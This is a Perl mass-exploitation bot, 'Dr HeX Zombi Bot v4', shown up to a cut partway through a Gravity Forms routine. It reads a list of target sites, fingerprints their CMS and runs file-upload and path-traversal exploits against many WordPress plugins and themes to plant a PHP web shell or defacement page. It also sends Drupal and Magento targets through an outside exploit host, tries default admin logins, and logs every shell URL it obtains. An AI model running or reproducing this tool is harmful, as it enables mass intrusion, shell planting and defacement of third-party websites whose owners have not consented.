#!/usr/bin/perl
use WWW::Mechanize;
use LWP::Simple;
use Win32::Console::ANSI;
use URI::URL;
use LWP::UserAgent;
use Getopt::Long;
use HTTP::Request::Common;
use Term::ANSIColor;
use HTTP::Request::Common qw(GET);
use Getopt::Long;
use HTTP::Request;
use LWP::UserAgent;
use Digest::MD5 qw(md5 md5_hex);
use MIME::Base64;
use IO::Select;
use HTTP::Cookies;
use HTTP::Response;
use Term::ANSIColor;
use HTTP::Request::Common qw(POST);
use URI::URL;
use DBI;
use IO::Socket;
use IO::Socket::INET;
use WWW::Mechanize;
use threads;

system ("title Dr HeX Zombi Bot v4 ");
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); } 
 $hexhrabchedched = "
       _____         _    _           
      |  __ >       | |  | |          
      | |  | |_ _ _ | |__| | _____  __
      | |  | | '__  |  __  |/ _ \ \/ /
      | |__| | |    | |  | |  __/>  < 
      |_____/|_|    |_|  |_|\___/_/\_\
           Zombi Bot v4 Extra 
 [+] - 544 Exploit (Mixed)
 [+} - Last Update :17/05/2018
\n\n";
print color('bold Yellow'),$hexhrabchedched;
################ Check Update #####################
print "Spead (Best 50) : \n";
my $thr = <STDIN>;
chomp $thr;
print "List Dir : \n";

my $file = <STDIN>;
chomp $file;

open(sites,"<".$file) or die $!;
while($site = <sites>)
{
chomp($site);
push(@threads, threads->create (\&bot, $site));
sleep(1) while(scalar threads->list(threads::running) >= $thr);
}
eval {
$_->join foreach @threads;
@threads = ();
};
close(sites);

sub bot(){

cmsdetc();
}

sub cmsdetc($site){

################ CMS Detec #####################
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (15);
$magsite = $site . '/admin';
my $magcms = $ua->get("$magsite")->content;
my $hexxy = $ua->get("$site")->content;
if($hexxy =~/wp-content\/themes\/|wp-content\/plugins\/|wordpress/) {
print color('bold white'), "[-] $site";	
print color("bold Yellow"), " - WordPress\n\n";print color('reset');
open(save, '>>sites/wordpress.txt');
print save "$site\n";
close(save);
wpinstallcheck();
revslider();
addblockblocker();
blaze();
catpro();
cherry();
downloadsmanager();
formcraft();
levoslideshow();
powerzoomer();
gravityforms();
getconfig();
getconfig2();
showbiz();
ads();
slideshowpro();
wpmobiledetector();
wysija();
inboundiomarketing();
dzszoomsounds();
reflexgallery();
sexycontactform();
sexycontactform2();
simpleplugin();
wtffu();
phpeventcalendar();
synoptic();
Wpshop();
wpinjetc($site).
gravityy();
acento();
ajaxstore();
Antioch();
Authentic();
Churchope();
Epic();
Felis();
Force();
FR0();
hbaudio();
History();
Imageex();
kbslider();
Linenity();
Lote27();
Markant();
MichaelCanthony();
mTheme();
NativeChurch();
Parallelus();
RedSteel();
Revsliderss();
S3bubble();
SMWF();
TheLoft();
Trinity();
Urbancity();
Yakimabait();
Membership();
FileManagerwp();
Googlemp3();
Justifiedim();
Justified2();
Justified3();
Aspose();
Asposedoc();
MiwoFTP();
MiwoFTP2();
miniaudioplayer();
Ypotheme();
Media14();
wpmon();
mapprolbs();

}

elsif($hexxy =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|com_content|Joomla!/) {
print color('bold white'),"[-] $site";	
print color("bold Yellow"), " - Joomla\n\n";    print color('reset');
open(save, '>>sites/joomla.txt');
print save "$site\n";
close(save);
fox2();
b22j();
b2j();
comjce();
comedia();
comjdownloads();
comjdownloadsdef();
comfabrik();
comfabrikdef();
comfabrik2();
comfabrikdef2();
hdflvplayer();
comadsmanager();
comblog();
comusers();
comweblinks();
com_content();
mod_simplefileupload();
com_search();
com_admin1();
com_admin2();
com_content1();
com_content2();
com_weblinks();
com_mailto();
com_content3();
com_content4();
com_users();
com_installer();
com_search1();
com_poll();
com_banners();
com_mailto1();
com_a6mambocredits();
com_a6mambohelpdesk();
com_advancedpoll();
com_akocomment();
com_articles();
com_artlinks();
com_trade();
com_bayesiannaivefilter();
com_babackup();
redmy();
facile();
sujks();
rocks();
genesissimple();
developertools();
artuploader();
fancys();
hwdvideoshare();
ksadvertiser();
osproperty();
collector();
NovaSFH();
Jimtawl();
Proclaim();

}elsif($hexxy =~/Drupal|drupal|sites\/all|drupal.org/) {
print color('bold white'),"[-] $site";	
print color("bold Yellow"), " - Drupal\n\n";print color('reset');
open(save, '>>sites/DRUPAL.txt');
print save "$site\n";
close(save);
Drupal();
}elsif($cms =~/Prestashop|prestashop/) {
print color('bold white'),"\n[$a] $site - ";
print color("bold Yellow"), "Prestashop\n\n";
print color('reset');
open(save, '>>sites/Prestashop.txt');
print save "$site\n";   
close(save);
hexking();
columnadverts();
soopamobile();
soopabanners();
vtermslideshow();
simpleslideshow();
productpageadverts();
homepageadvertise();
homepageadvertise2();
jro_homepageadvertise();
attributewizardpro();
oneattributewizardpro();
attributewizardproOLD();
attributewizardpro_x();
advancedslider();
cartabandonmentpro();
cartabandonmentproOld();
videostab();
wg24themeadministration();
fieldvmegamenu();
wdoptionpanel();
pk_flexmenu();
pk_vertflexmenu();
nvn_export_orders();
megamenu();
tdpsthemeoptionpanel();
psmodthemeoptionpanel();
masseditproduct();
}
elsif($magcms =~/Log into Magento Admin Page|name=\"dummy\" id=\"dummy\"|Magento/) {
print color('bold white'),"[-] $site";	
print color("bold Yellow"), " - Magento\n\n";print color('reset');
open(save, '>>sites/Magento.txt');
print save "$site\n";
close(save);
magento();
}elsif($hexxy =~/route=product|OpenCart|route=common|catalog\/view\/theme/) {
print color('bold white'),"[-] $site";	
print color("bold white"), " - OpenCart\n\n";print color('reset');
open(save, '>>sites/vbulletin.txt');
print save "$site\n";
close(save);
opencart();
}elsif($efreez =~/<meta name="description" content="vBulletin Forums" \/>|<meta name="generator" content="vBulletin" \/>|vBulletin.version =|"baseurl_core":/){
print color('bold white'),"[-] $site";	
print color("bold Yellow"), " - vBulletin\n\n";print color('reset');
open(save, '>>sites/vbulletin.txt');
print save "$site\n";
close(save);
}else{
print color('bold white'),"[-] $site";	
print  color("bold red"), " - PHP Site\n\n";print color('reset');
}
}








#  _____                         _ 
# |  __ \                       | |
# | |  | |_ __ _   _ _ __   __ _| |
# | |  | | '__| | | | '_ \ / _` | |
# | |__| | |  | |_| | |_) | (_| | |
# |_____/|_|   \__,_| .__/ \__,_|_|
#                   | |            
#                   |_|     
       
################ Drupal  Exploit #####################

sub Drupal(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Drupal  +++++++++++++++++++++++++++ ";


$drupalink = "http://localhots/drup.php";
my $exploit = "$drupalink?url=$site&submit=submit";
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/Success!/) {
$admin ="admin";
$pass  ="admin";
$wp = $site . '/user/login';
$red = $site . '/user/1';

$brute = POST $wp, [name => $admin, pass => $pass, form_build_id =>'', form_id => 'user_login',op => 'Log in', location => $red];
$response = $ua->request($brute);
$stat = $response->status_line;
    if ($stat =~ /302/){
    print color('bold Yellow');
print "[True Success]\n";
    print color('reset');
print "$site => User | $admin Password | $pass\n ";
    open(save, '>>Zombi_v4/bruteDrup.txt');
    print save "[Drupal] $site/user/login | username : admin | pass: admin\n";
    close(save);
    }
    elsif ($stat =~ /404/){

    print color('bold red');
print  "False\n";
    print color('reset');
    }
}else{

    print color('bold red');
print  "False\n";
    print color('reset');


        }

}

#  __  __                        _        
# |  \/  |                      | |       
# | \  / | __ _  __ _  ___ _ __ | |_ ___  
# | |\/| |/ _` |/ _` |/ _ \ '_ \| __/ _ \ 
# | |  | | (_| | (_| |  __/ | | | || (_) |
# |_|  |_|\__,_|\__, |\___|_| |_|\__\___/ 
#                __/ |                    
#               |___/        
             
################ Magento Exploit #####################

sub magento(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);


print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Magento +++++++++++++++++++++++++++ ";

$magentoxlink = "http://misterhexbot.com/magentox.php";
my $exploithexmag = "$magentoxlink?url=$site&submit=submit";
my $checkksbir = $ua->get("$exploithexmag")->content;
if($checkksbir =~/Success /) {

    print color('bold Yellow');
print "[True Success]\n";
    print color('reset');
    open(save, '>>Zombi_v4/BruteMag.txt');
    print save "[Magento] $site hydra|hydra77\n";
    close(save);
    }
else{

    print color('bold red');
print  "False\n";
    print color('reset');


        }

}


################ Wordpress Exploits #####################
#                 ______            
#                |  ____|           
# __      ___ __ | |__  __  ___ __  
# \ \ /\ / / '_ \|  __| \ \/ / '_ \ 
#  \ V  V /| |_) | |____ >  <| |_) |
#   \_/\_/ | .__/|______/_/\_\ .__/ 
#          | |               | |    
#          |_|               |_|    

################ Adblock Blocker #####################
############### Revshell  ####################
sub revslider(){
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Revslider Shell +++++++++++++++++++ ";

my $path = "wp-admin/admin-ajax.php";


my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_plugin", update_file => ["v4rev.zip"]]);

if ($exploit->decoded_content =~ /Wrong update extracted folder/) {
    print color('bold Yellow');
print "[True Success]\n";
    print color('reset');

my $check = $ua->get("$site/wp-content/plugins/revslider/temp/update_extract/revslider/v4rev.php")->content;
if($check =~/Dr HeX/) {

print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Uploading Shell +++++++++++++++++++ ";
    print color('reset');
   print color('bold Yellow');
print "[True Success]\n";
    print color('reset');

    open(save, '>>Zombi_v4/v4shell.txt');
    print save "$site/wp-content/plugins/revslider/temp/update_extract/revslider/v4rev.php\n";
    close(save); 
	$def = "$site/def.html";
	zoneh();
    } else {  }
my $avada = $ua->get("$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/v4rev.php")->content;
if($avada =~/Dr HeX/) {

print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"[Uploading Shell] +++++++++++++++++++ ";
    print color('reset');
   print color('bold Yellow');
print "[True Success]\n";
    print color('reset');    open(save, '>>Zombi_v4/v4shell.txt');
    print save "$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/v4rev.php\n";
    close(save); 
    	$def = "$site/def.html";
	zoneh();

}
else {  }
my $striking_r = $ua->get("$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/v4rev.php")->content;
if($striking_r =~/Dr HeX/) {

print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"[Uploading Shell] +++++++++++++++++++ ";
    print color('reset');
   print color('bold Yellow');
print "[True Success]\n";
    print color('reset');    open(save, '>>Zombi_v4/v4shell.txt');
    print save "$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/v4rev.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else {  }
my $IncredibleWP = $ua->get("$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/v4rev.php")->content;
if($IncredibleWP =~/Dr HeX/) {

print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"[Uploading Shell] +++++++++++++++++++ ";
    print color('reset');
   print color('bold Yellow');
print "[True Success]\n";
    print color('reset');    open(save, '>>Zombi_v4/v4shell.txt');
    print save "$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/v4rev.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else {  }
my $ultimatum = $ua->get("$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/v4rev.php")->content;
if($ultimatum =~/Dr HeX/) {

print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"[Uploading Shell] +++++++++++++++++++ ";
    print color('reset');
   print color('bold Yellow');
print "[True Success]\n";
    print color('reset');    open(save, '>>Zombi_v4/v4shell.txt');
    print save "$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/v4rev.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else {  }
my $medicate = $ua->get("$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/v4rev.php")->content;
if($medicate =~/Dr HeX/) {

print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"[Uploading Shell] +++++++++++++++++++ ";
    print color('reset');
   print color('bold Yellow');
print "[True Success]\n";
    print color('reset');    open(save, '>>Zombi_v4/v4shell.txt');
    print save "$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/v4rev.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else {  }
my $centum = $ua->get("$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/v4rev.php")->content;
if($centum =~/Dr HeX/) {

print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"[Uploading Shell] +++++++++++++++++++ ";
    print color('reset');
   print color('bold Yellow');
print "[True Success]\n";
    print color('reset');    open(save, '>>Zombi_v4/v4shell.txt');
    print save "$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/v4rev.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else {  }
my $beach_apollo = $ua->get("$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/v4rev.php")->content;
if($beach_apollo =~/Dr HeX/) {

print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"[Uploading Shell] +++++++++++++++++++ ";
    print color('reset');
   print color('bold Yellow');
print "[True Success]\n";
    print color('reset');    open(save, '>>Zombi_v4/v4shell.txt');
    print save "$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/v4rev.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else { }
my $cuckootap = $ua->get("$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/v4rev.php")->content;
if($cuckootap =~/Dr HeX/) {

print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"[Uploading Shell] +++++++++++++++++++ ";
    print color('reset');
   print color('bold Yellow');
print "[True Success]\n";
    print color('reset');    open(save, '>>Zombi_v4/v4shell.txt');
    print save "$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/v4rev.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else {  }
my $pindol = $ua->get("$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/v4rev.php")->content;
if($pindol =~/Dr HeX/) {
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"[Uploading Shell] +++++++++++++++++++ ";
    print color('reset');
   print color('bold Yellow');
print "[True Success]\n";

    open(save, '>>Zombi_v4/v4shell.txt');
    print save "$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/v4rev.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else {  }
my $designplus = $ua->get("$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/v4rev.php")->content;
if($designplus =~/Dr HeX/) {

   print color('bold yellow');
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"[Uploading Shell] +++++++++++++++++++ ";
    print color('reset');
   print color('bold Yellow');
print "[True Success]\n";
    print color('reset');    open(save, '>>Zombi_v4/v4shell.txt');
    print save "$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/v4rev.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else {  }
my $rarebird = $ua->get("$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/v4rev.php")->content;
if($rarebird =~/Dr HeX/) {

   print color('bold yellow');
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"[Uploading Shell] +++++++++++++++++++ ";
    print color('reset');
   print color('bold Yellow');
print "[True Success]\n";
    print color('reset');
    open(save, '>>Zombi_v4/v4shell.txt');
    print save "$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/v4rev.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else {  }
my $andre = $ua->get("$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/v4rev.php")->content;
if($andre =~/Dr HeX/) {

print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"[Uploading Shell] +++++++++++++++++++ ";
    print color('reset');
   print color('bold Yellow');
print "[True Success]\n";
    print color('reset');    open(save, '>>Zombi_v4/v4shell.txt');
    print save "$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/v4rev.php\n";
    close(save); 
		$def = "$site/def.html";
	zoneh();

}
else { }
} else {
    print color('bold red');
print  "False\n";
    print color('reset');
}
}

################ Adblock Blocker #####################
sub addblockblocker(){

my $addblockurl = "$site/wp-admin/admin-ajax.php?action=getcountryuser&cs=2";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [popimg => ["v4.php"],]);
$addblockup="$site/wp-content/uploads/$year/$month/v4.php";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/Dr HeX Shell/) {
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Adblock Blocker";
print color('bold white')," +++++++++++++++++++ ";
print color('bold white'),"";
print color('bold Yellow'),"VULN";
print color('bold white'),"\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $addblockup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$addblockup\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Adblock Blocker";
print color('bold white')," +++++++++++++++++++ ";
print color('bold red'),"False";
print color('bold white'),"\n";}
}

################ Blaze #####################
sub blaze(){
my $url = "$site/wp-admin/admin.php?page=blaze_manage";
my $blazeres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["v4.php"], task => 'blaze_add_new_album', album_name => '', album_desc => '',]);

if ($blazeres->content =~ /\/uploads\/blaze\/(.*?)\/big\/v4.php/) {
$uploadfolder=$1;
$blazeup="$site/wp-content/uploads/blaze/$uploadfolder/big/v4.php";
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Blaze";
print color('bold white')," +++++++++++++++++++++++++++++ ";
print color('bold white'),"";
print color('bold Yellow'),"VULN";
print color('bold white'),"\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $blazeup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$blazeup\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Blaze";
print color('bold white')," +++++++++++++++++++++++++++++ ";
print color('bold red'),"False";
print color('bold white'),"\n";
}
}

################ Job_Manager #####################

 sub mods(){
 
my $gh = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$gh->timeout(10);
$gh->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
   
   
$files="v4hex.gif";
$jdup= $site . '/jm-ajax/upload_file';
$checkgif= $site . "/wp-content/uploads/job-manager-uploads/company_logo/$year/$month/v4hex.gif";
$checkgif2= $site . "/wp-content/uploads/job-manager-uploads/company_logo/$year/$month/v4hex.gif";


my $exploit = $gh->post("$jdup", Content_Type => "multipart/form-data", Content => [  company_logo=>["$files"]  ]);



my $check = $gh->get("$checkgif")->status_line;
if($check =~/200/) {
my $check1 = $gh->get("$checkgif2")->content_type;
if($check1 =~/image\/gif/) {
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Job Manager";
print color('bold white')," +++++++++++++++++++++++ ";
print color('bold white'),"";
print color('bold Yellow'),"VULN";
print color('bold white'),"\n";
print color("bold white"),("[Upload Successfully] ==> $site/wp-content/uploads/job-manager-uploads/company_logo/2017/06/v4hex.gif\n");
print color 'reset';                 
        open (TEXT, '>>Zombi_v4/uploaded.txt');
		print TEXT "[Get] => $site/wp-content/uploads/job-manager-uploads/company_logo/2017/06/v4hex.gif\n";
        close (TEXT);
}
}
else
{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";


print color('bold white'),"Job Manager";
print color('bold white')," +++++++++++++++++++++++ ";
print color('bold red'),"False";
print color('bold white'),"\n";
}
}

################ gravity deface #####################
sub gravityy(){
chomp($_);
$site = $_;
my $path = "/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["v4def.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../", name => "hex.php5"]);

if ($exploit->decoded_content =~ /_input_3_hex.php5/) {
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Gravity Deface";
print color('bold white')," ++++++++++++++++++++ ";
print color('bold white'),"";
print color('bold Yellow'),"VULN";
print color('bold white'),"\n";
print color('bold white'),"Index Uploaded Successfully\n";
print color('bold white'),"  [Get] => $site/wp-content/uploads/_input_3_hex.php5\n";
open(save, '>>Zombi_v4/mh-wiss.txt');
    print save "$site/wp-content/uploads/_input_3_hex.php5\n";
    close(save);
}

else { 
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Gravity Deface";
print color('bold white')," ++++++++++++++++++++ ";
print color('bold red'),"False";
print color('bold white'),"\n";

}
}
################ Catpro #####################
sub catpro(){

my $url = "$site/wp-admin/admin.php?page=catpro_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["v4.php"], task => 'cpr_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/catpro\/(.*?)\/big\/v4.php/) {
$uploadfolder=$1;
$catproup="$site/wp-content/uploads/catpro/$uploadfolder/big/v4.php";
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Catpro";
print color('bold white')," ++++++++++++++++++++++++++++ ";
print color('bold white'),"";
print color('bold Yellow'),"VULN";
print color('bold white'),"\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $catproup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$catproup\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Catpro";
print color('bold white')," ++++++++++++++++++++++++++++ ";
print color('bold red'),"False";
print color('bold white'),"\n";
}
}


################ Cherry Plugin #####################
sub cherry(){

my $url = "$site/wp-content/plugins/cherry-plugin/admin/import-export/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["v4.php"],]);

$cherryup="$site/wp-content/plugins/cherry-plugin/admin/import-export/v4.php";

my $checkcherry = $ua->get("$cherryup")->content;
if($checkcherry =~/Dr HeX Shell/) {
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Cherry Plugin";
print color('bold white')," =====HeX=====> ";
print color('bold white'),"";
print color('bold Yellow'),"VULN";
print color('bold white'),"\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $cherryup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$cherryup\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Cherry Plugin";
print color('bold white')," =====HeX=====> ";
print color('bold red'),"False";
print color('bold white'),"\n";
}
}

################ Download Manager #####################
sub downloadsmanager(){
$downloadsmanagervuln="$site/wp-content/plugins/downloads-manager/readme.txt";
my $url = "$site";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [upfile => ["v4.php"], dm_upload => '',]);
$dmup="$site/wp-content/plugins/downloads-manager/upload/v4.php";
my $checkdm = $ua->get("$dmup")->content;
if($checkdm =~/Dr HeX Shell/) {
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Download Manager";
print color('bold white')," =====HeX=====> ";
print color('bold Yellow'),"VULN";
print color('bold white'),"\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $dmup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$dmup\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Download Manager";
print color('bold white')," =====HeX=====> ";
print color('bold red'),"False";
print color('bold white'),"\n";
}
}

############### formcraft ####################

sub formcraft(){

print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"FormCraft Upload ++++++++++++++++++ ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);
$link = $site."/wp-content/plugins/formcraft/file-upload/server/php/";
my $conte = $ua->get("$link")->content;
if ($conte =~/{"files"/){
   
    upform();
}else{
    print color('bold red');
print  "False\n";
    print color('reset');

}

}

sub upform(){
{
my $url = "$site/wp-content/plugins/formcraft/file-upload/server/php/";
my $picture ="v4.php"; 
my $field_name = "files[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$picture"] ]
           
            );
$upzzhex = $site. '/wp-content//plugins//formcraft//file-upload//server//php//files//v4.php'; 
my $taz = $ua->get("$upzzhex")->content;
if ($taz =~ /Dr HeX Shell/){
   print color('bold Yellow');
print "[True Success]\n";
print color('reset');
print color('bold Yellow')," [";
print color('bold red'),"+";
print color('bold Yellow'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $upzzhex\n";

open(save, '>>Zombi_v4/v4shell.txt');   
print save "$upzzhex\n";   
close(save);
}else{
    print color('bold red');
print  "False\n";
    print color('reset');}
}

}

################ levoslideshow #####################
sub levoslideshow(){

my $url = "$site/wp-admin/admin.php?page=levoslideshow_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["v4.php"], task => 'lvo_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/levoslideshow\/(.*?)\/big\/v4.php/) {
$uploadfolder=$1;
$levoslideshowup="$site/wp-content/uploads/levoslideshow/$uploadfolder/big/v4.php";
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"levoslideshow";
print color('bold white')," =====HeX=====> ";
print color('bold white'),"";
print color('bold Yellow'),"[True Success]";
print color('bold white'),"\n";
print color('bold Yellow')," [";
print color('bold red'),"+";
print color('bold Yellow'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $levoslideshowup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$levoslideshowup\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"levoslideshow";
print color('bold white')," =====HeX=====> ";
print color('bold red'),"False";
print color('bold white'),"\n";
}
}
################ Power Zoomer #####################
sub powerzoomer(){ 
my $url = "$site/wp-admin/admin.php?page=powerzoomer_manage";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["v4.php"], task => 'pwz_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/powerzoomer\/(.*?)\/big\/v4.php/) {
$uploadfolder=$1;
$zoomerup="$site/wp-content/uploads/powerzoomer/$uploadfolder/big/v4.php";
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Power Zoomer";
print color('bold white')," ++++++++++++++++++++++ ";
print color('bold Yellow'),"[True Success]";
print color('bold white'),"\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $zoomerup\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Power Zoomer";
print color('bold white')," ++++++++++++++++++++++ ";
print color('bold red'),"False";
print color('bold white'),"\n";
}
}

################ Gravity Forms #####################
sub gravityforms(){
my $url = "$site/?gf_page=upload";
